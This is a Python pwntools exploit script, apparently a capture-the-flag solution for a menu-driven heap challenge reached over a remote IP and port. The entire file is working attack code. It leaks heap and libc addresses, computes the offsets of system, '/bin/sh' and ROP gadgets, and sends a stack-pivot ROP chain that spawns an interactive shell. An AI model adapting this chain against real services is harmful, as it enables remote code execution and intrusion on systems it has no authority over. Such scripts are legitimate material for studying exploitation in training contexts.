#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('./pwn')
# p = process('./pwn', env={'LD_PRELOAD':'libc-2.23.so'})
p = remote('8.131.69.237', 52642)

'''
1. Init
2. create
3. add
4. set
5. show
6. size
7. exit
'''

def Init():
  p.sendlineafter('choice:', str(1))

def create():
  p.sendlineafter('choice:', str(2))

def add(Size):
  p.sendlineafter('choice:', str(3))
  p.sendafter('please input size:', Size)

def set_(payload):
  p.sendlineafter('choice:', str(4))
  p.sendafter('content:', payload)

def show():
  p.sendlineafter('choice:', str(5))

def call():
  pass
 
if __name__ == "__main__":
  __malloc_hook_offset = 0x00000000003c4b10

  Init()
  create()
  add(str(0x88))
  show()
  p.recvuntil('show:\n')
  p.recv(8)
  heap = u64(p.recv(8))
  success('heap:\t' + str(hex(heap)))

  payload = '\x00' * 0x10 + '/bin/sh\x00'
  set_(payload)
  Init()
  show()
  p.recvuntil('show:\n')
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 88 - 0x10 - __malloc_hook_offset
  success('libc:\t' + str(hex(libc)))

  system = libc + 0x0453a0
  bin_sh = libc + 0x18ce17
  xchg = libc + 0x1834B9  # xchg eax, esp ; ret
  pop_rdi_ret = libc + 0x0000000000021112 
  pop3_ret = libc + 0x0000000000020269 # pop rsi ; pop r15 ; pop rbp ; ret


  add(str(0x88))
  payload = p64(heap - 0xc0 + 0x20) + p64(0) + p64(pop3_ret) + p64(0) + p64(xchg) + p64(0) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
  set_(payload)

  success('heap:\t' + str(hex(heap)))
  success('libc:\t' + str(hex(libc)))
  p.interactive()